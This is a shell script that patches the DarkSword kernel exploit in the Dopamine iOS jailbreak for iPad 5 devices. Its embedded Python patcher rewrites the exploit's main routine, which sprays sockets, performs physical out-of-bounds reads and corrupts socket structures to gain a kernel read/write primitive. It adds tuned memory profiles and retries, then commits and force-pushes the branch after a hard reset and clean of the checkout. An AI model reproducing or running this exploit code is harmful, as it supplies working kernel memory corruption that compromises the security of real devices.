#!/bin/sh
set -eu
export PATH="/var/jb/usr/bin:/var/jb/usr/sbin:/usr/bin:/usr/sbin:/bin:/sbin:$PATH"
export HOME=/var/mobile
REPO=/var/mobile/Documents/DarkSword-Workspace/Dopamine
BRANCH=ipad5/adaptive-lowmem-v1
TARGET="$REPO/Application/Dopamine/Exploits/DarkSword/DarkSword.m"

cd "$REPO"
git fetch origin main
git reset --hard origin/main
git clean -fd
git switch -C "$BRANCH" origin/main

git config user.name "NightVibes33 iPad"
git config user.email "NightVibes33@users.noreply.github.com"

python3 - "$TARGET" <<'PY'
import sys
from pathlib import Path

path = Path(sys.argv[1])
text = path.read_text()


def replace_once(src, old, new, label):
    count = src.count(old)
    if count != 1:
        raise SystemExit(f"patch_error={label}:expected_1_found_{count}")
    return src.replace(old, new, 1)

text = replace_once(
    text,
    '#include <mach/mach.h>\n',
    '#include <mach/mach.h>\n#include <mach/task_info.h>\n#include <errno.h>\n#include <stdarg.h>\n',
    'includes',
)

old_spray = '''    fileport_t outputSocketPort = 0;
    fileport_makeport(fd, &outputSocketPort);
    close(fd);

    void *socketInfo = calloc(1, 0x400);
    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
'''
new_spray = '''    fileport_t outputSocketPort = MACH_PORT_NULL;
    int fpResult = fileport_makeport(fd, &outputSocketPort);
    close(fd);
    if (fpResult != 0 || outputSocketPort == MACH_PORT_NULL) {
        printf("[-] fileport_makeport failed: %d\\n", fpResult);
        return -1;
    }

    void *socketInfo = calloc(1, 0x400);
    if (!socketInfo) {
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }

    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    if (r < 0 || r < 0x118) {
        printf("[-] socket info query failed: result=%d errno=%d\\n", r, errno);
        free(socketInfo);
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }

    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);
    free(socketInfo);

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
'''
text = replace_once(text, old_spray, new_spray, 'socket-leak-fix')

text = replace_once(
    text,
    'bool isA18Device = false;\n\nvoid pe_v1(void)\n{',
    '''bool isA18Device = false;
bool isIPad5Device = false;
static unsigned gIPad5Pass = 0;
static NSString *gIPad5LogPath = nil;

typedef struct {
    uint64_t totalPages;
    uint64_t mappingPages;
    unsigned socketTarget;
    unsigned passes;
    const char *name;
} ipad5_darksword_profile_t;

static void ipad5_log(const char *format, ...)
{
    if (!isIPad5Device) return;
    char message[1024] = {0};
    va_list args;
    va_start(args, format);
    vsnprintf(message, sizeof(message), format, args);
    va_end(args);
    printf("[iPad5-Adaptive] %s\\n", message);
    fflush(stdout);
    if (gIPad5LogPath) {
        FILE *file = fopen(gIPad5LogPath.fileSystemRepresentation, "a+");
        if (file) {
            fprintf(file, "[%s] %s\\n", [NSDate date].description.UTF8String, message);
            fclose(file);
        }
    }
}

static void ipad5_log_memory(const char *stage)
{
    if (!isIPad5Device) return;
    mach_task_basic_info_data_t info = {0};
    mach_msg_type_number_t count = MACH_TASK_BASIC_INFO_COUNT;
    kern_return_t kr = task_info(mach_task_self(), MACH_TASK_BASIC_INFO,
                                 (task_info_t)&info, &count);
    if (kr == KERN_SUCCESS) {
        ipad5_log("memory stage=%s resident=%lluMB virtual=%lluMB pass=%u",
                  stage,
                  (unsigned long long)(info.resident_size / (1024ULL * 1024ULL)),
                  (unsigned long long)(info.virtual_size / (1024ULL * 1024ULL)),
                  gIPad5Pass);
    }
}

static void ipad5_init_log(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                               NSUserDomainMask,
                                                               YES).firstObject;
    if (documents) {
        gIPad5LogPath = [documents stringByAppendingPathComponent:@"DarkSword-iPad5-Adaptive.log"];
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    ipad5_log("session-start profile=v1 model=iPad6,11/iPad6,12");
}

int pe_v1(void)
{''',
    'adaptive-globals',
)

start = text.index('int pe_v1(void)\n{')
end = text.index('\nvoid pe_v2(void)', start)
new_pe = r'''int pe_v1(void)
{
    static const ipad5_darksword_profile_t ipad5Profiles[] = {
        { 0x8000, 0x1000, 16384, 2, "balanced-512MB" },
        { 0x6000, 0x0C00, 12288, 2, "compact-384MB" },
        { 0x4000, 0x0800,  8192, 2, "minimum-256MB" },
    };

    void *readBuffer = calloc(1, OOB_SIZE);
    void *writeBuffer = calloc(1, OOB_SIZE);
    if (!readBuffer || !writeBuffer) {
        free(readBuffer);
        free(writeBuffer);
        return -1;
    }

    initialize_physical_read_write(OOB_PAGES_NUM * PAGE_SIZE);
    mach_vm_address_t wiredMapping = 0;
    mach_vm_size_t wiredMappingSize = 1024ULL * 1024ULL * 1024ULL * 3ULL;
    kern_return_t kr = KERN_SUCCESS;
    if (isA18Device) {
        kr = mach_vm_allocate(mach_task_self(), &wiredMapping, wiredMappingSize, VM_FLAGS_ANYWHERE);
        printf("[+] wiredMapping: %#llx\n", wiredMapping);
    }

    NSMutableArray *targetInpGencntList = [NSMutableArray new];
    unsigned profileIndex = 0;
    unsigned passInProfile = 0;

    while (true) {
        uint64_t totalSearchMappingPagesNum = isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);
        uint64_t searchMappingSize = isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);
        unsigned socketTarget = (10240 * 3) - (4096 * 2);
        const char *profileName = "stock";

        if (isIPad5Device) {
            if (profileIndex >= (sizeof(ipad5Profiles) / sizeof(ipad5Profiles[0]))) {
                ipad5_log("profiles-exhausted total_passes=%u", gIPad5Pass);
                free(readBuffer);
                free(writeBuffer);
                return -1;
            }
            const ipad5_darksword_profile_t *profile = &ipad5Profiles[profileIndex];
            totalSearchMappingPagesNum = profile->totalPages;
            searchMappingSize = profile->mappingPages * PAGE_SIZE;
            socketTarget = profile->socketTarget;
            profileName = profile->name;
            gIPad5Pass++;
            passInProfile++;
            ipad5_log("pass-start profile=%s profile_index=%u pass=%u/%u total_pass=%u target_memory=%lluMB sockets=%u",
                      profileName, profileIndex, passInProfile, profile->passes, gIPad5Pass,
                      (unsigned long long)((totalSearchMappingPagesNum * PAGE_SIZE) / (1024ULL * 1024ULL)),
                      socketTarget);
            ipad5_log_memory("before-allocation");
        }

        uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;
        uint64_t searchMappingNum = totalSearchMappingSize / searchMappingSize;
        printf("[i] profile: %s\n", profileName);
        printf("[i] totalSearchMappingPagesNum: %#llx\n", totalSearchMappingPagesNum);
        printf("[i] searchMappingSize: %#llx\n", searchMappingSize);
        printf("[i] totalSearchMappingSize: %#llx\n", totalSearchMappingSize);
        printf("[i] searchMappingNum: %#llx\n", searchMappingNum);

        if (isA18Device) {
            surface_mlock(wiredMapping, wiredMappingSize);
            for (uint64_t s = 0; s < (wiredMappingSize / PAGE_SIZE); s++) {
                *(uint64_t *)(wiredMapping + (s * PAGE_SIZE)) = 0;
            }
        }

        NSMutableArray<NSNumber *> *searchMappings = [NSMutableArray new];
        bool mappingAllocationFailed = false;
        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = 0;
            kr = mach_vm_allocate(mach_task_self(), &searchMappingAddress, searchMappingSize,
                                  VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) {
                printf("[-] mach_vm_allocate failed: %s\n", mach_error_string(kr));
                mappingAllocationFailed = true;
                break;
            }
            for (uint64_t k = 0; k < searchMappingSize; k += PAGE_SIZE) {
                *(uint64_t *)(searchMappingAddress + k) = randomMarker;
            }
            [searchMappings addObject:@(searchMappingAddress)];
        }

        if (mappingAllocationFailed) {
            while (searchMappings.lastObject) {
                mach_vm_address_t address = searchMappings.lastObject.unsignedLongLongValue;
                [searchMappings removeLastObject];
                mach_vm_deallocate(mach_task_self(), address, searchMappingSize);
            }
            if (isA18Device) surface_munlock(wiredMapping, wiredMappingSize);
            if (isIPad5Device) {
                ipad5_log("allocation-failed profile=%s; advancing profile", profileName);
                profileIndex++;
                passInProfile = 0;
            }
            continue;
        }

        socketPorts = [NSMutableArray new];
        socketPcbIds = [NSMutableArray new];
        unsigned socketPortsCount = 0;
        for (unsigned socketCount = 0; socketCount < socketTarget; socketCount++) {
            mach_port_t port = spray_socket(socketPorts, socketPcbIds);
            if (port == (mach_port_t)-1) {
                printf("[-] Failed to spray sockets: %u\n", socketCount);
                break;
            }
            socketPortsCount++;
        }

        if (socketPortsCount < 2) {
            sockets_release(socketPorts, socketPcbIds);
            while (searchMappings.lastObject) {
                mach_vm_address_t address = searchMappings.lastObject.unsignedLongLongValue;
                [searchMappings removeLastObject];
                mach_vm_deallocate(mach_task_self(), address, searchMappingSize);
            }
            if (isA18Device) surface_munlock(wiredMapping, wiredMappingSize);
            if (isIPad5Device) ipad5_log("socket-spray-too-small count=%u", socketPortsCount);
            continue;
        }

        uint64_t startPcbId = socketPcbIds.firstObject.unsignedLongLongValue;
        uint64_t endPcbId = socketPcbIds.lastObject.unsignedLongLongValue;
        printf("[i] socketPortsCount: %u\n", socketPortsCount);
        printf("[i] startPcbId: %llu\n", startPcbId);
        printf("[i] endPcbId: %llu\n", endPcbId);
        if (isIPad5Device) {
            ipad5_log("socket-spray-complete profile=%s created=%u target=%u", profileName,
                      socketPortsCount, socketTarget);
            ipad5_log_memory("after-spray");
        }

        bool success = false;
        for (uint64_t s = 0; s < searchMappings.count; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings[s].unsignedLongLongValue;
            printf("[i] looking in search mapping: %llu\n", s);
            mach_port_t memoryObject = MACH_PORT_NULL;
            mach_vm_size_t memoryObjectSize = searchMappingSize;
            kr = mach_make_memory_entry_64(mach_task_self(), &memoryObjectSize,
                                           searchMappingAddress, VM_PROT_DEFAULT,
                                           &memoryObject, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS || memoryObject == MACH_PORT_NULL) {
                printf("[-] mach_make_memory_entry_64 failed: %s\n", mach_error_string(kr));
                continue;
            }

            surface_mlock(searchMappingAddress, searchMappingSize);
            mach_vm_offset_t seekingOffset = 0;
            while (seekingOffset <= searchMappingSize - pcSize) {
                kr = physical_oob_read_mo(memoryObject, seekingOffset, OOB_SIZE,
                                          OOB_OFFSET, readBuffer);
                if (kr == KERN_SUCCESS &&
                    find_and_corrupt_socket(memoryObject, seekingOffset, readBuffer,
                                            writeBuffer, targetInpGencntList, false) == KERN_SUCCESS) {
                    success = true;
                    break;
                }
                seekingOffset += PAGE_SIZE;
            }

            surface_munlock(searchMappingAddress, searchMappingSize);
            kr = mach_port_deallocate(mach_task_self(), memoryObject);
            if (kr != KERN_SUCCESS) {
                printf("[-] mach_port_deallocate failed: %s\n", mach_error_string(kr));
            }
            if (success) break;
        }

        sockets_release(socketPorts, socketPcbIds);
        while (searchMappings.lastObject) {
            mach_vm_address_t address = searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];
            mach_vm_deallocate(mach_task_self(), address, searchMappingSize);
        }
        if (isA18Device) surface_munlock(wiredMapping, wiredMappingSize);

        if (isIPad5Device) ipad5_log_memory("after-cleanup");
        if (success) {
            if (isIPad5Device) ipad5_log("primitive-acquired profile=%s pass=%u", profileName, gIPad5Pass);
            free(readBuffer);
            free(writeBuffer);
            return 0;
        }

        if (isIPad5Device) {
            const ipad5_darksword_profile_t *profile = &ipad5Profiles[profileIndex];
            ipad5_log("pass-miss profile=%s pass=%u/%u", profileName,
                      passInProfile, profile->passes);
            if (passInProfile >= profile->passes) {
                profileIndex++;
                passInProfile = 0;
            }
        }
    }
}
'''
text = text[:start] + new_pe + text[end:]

text = replace_once(
    text,
    '    isA18Device = (bool)strstr(name.machine, "iPhone17,");\n',
    '''    isIPad5Device = (bool)(strstr(name.machine, "iPad6,11") ||
                                 strstr(name.machine, "iPad6,12"));
    if (isIPad5Device) {
        ipad5_init_log();
        ipad5_log("device-detected model=%s", name.machine);
    }

    isA18Device = (bool)strstr(name.machine, "iPhone17,");
''',
    'device-detection',
)

text = replace_once(
    text,
    '        pe_init();\n        pe_v1();\n',
    '''        pe_init();
        int peResult = pe_v1();
        if (peResult != 0) {
            if (isIPad5Device) ipad5_log("exploit-failed result=%d", peResult);
            goSync = 0;
            raceSync = 1;
            pthread_join(freeThread, NULL);
            close(writeFd);
            close(readFd);
            return peResult;
        }
''',
    'pe-result',
)

path.write_text(text)
print('patch_status=applied')
PY

mkdir -p research
cat > research/IPAD5_ADAPTIVE_LOWMEM_V1.md <<'EOF'
# iPad 5 DarkSword adaptive low-memory profile v1

Target: iPad6,11 / iPad6,12 on iOS 16.7.x only.

Changes:
- Keeps the stock DarkSword path unchanged for all other devices.
- Frees the 0x400-byte userspace socket metadata buffer after every spray.
- Validates socket/fileport creation and short metadata responses.
- Calls `surface_munlock` for every scanned search mapping before deallocation.
- Uses bounded profiles: 512 MB + 16,384 sockets, 384 MB + 12,288 sockets, and 256 MB + 8,192 sockets.
- Runs two clean attempts per profile and exits with an error after six misses.
- Preserves stdout and writes sparse stage/memory telemetry to `DarkSword-iPad5-Adaptive.log`.

This branch must be validated from a stock boot. A successful build does not prove exploitation success.
EOF

# Static invariants and syntax-oriented checks.
python3 - <<'PY'
from pathlib import Path
p=Path('Application/Dopamine/Exploits/DarkSword/DarkSword.m')
t=p.read_text()
checks={
'adaptive marker':'iPad5-Adaptive',
'device gate':'strstr(name.machine, "iPad6,11")',
'512 profile':'{ 0x8000, 0x1000, 16384, 2',
'384 profile':'{ 0x6000, 0x0C00, 12288, 2',
'256 profile':'{ 0x4000, 0x0800,  8192, 2',
'socket free':'free(socketInfo);',
'mapping unlock':'surface_munlock(searchMappingAddress, searchMappingSize);',
'bounded failure':'profiles-exhausted',
}
for name,needle in checks.items():
    c=t.count(needle)
    print(f'check={name} count={c}')
    if c < 1: raise SystemExit(f'missing={name}')
if 'freopen(' in t:
    raise SystemExit('unsafe_stdout_redirect_present')
print('static_checks=success')
PY

git diff --check
git status --short
git diff --stat
git diff -- Application/Dopamine/Exploits/DarkSword/DarkSword.m | sed -n '1,260p'

git add Application/Dopamine/Exploits/DarkSword/DarkSword.m research/IPAD5_ADAPTIVE_LOWMEM_V1.md
git commit -m "Add adaptive low-memory DarkSword profile for iPad 5"
git push --force-with-lease -u origin "$BRANCH"

echo "branch=$BRANCH"
printf 'pushed_head='; git rev-parse HEAD
printf 'main_untouched='; git rev-parse origin/main
echo 'ipad_push=success'
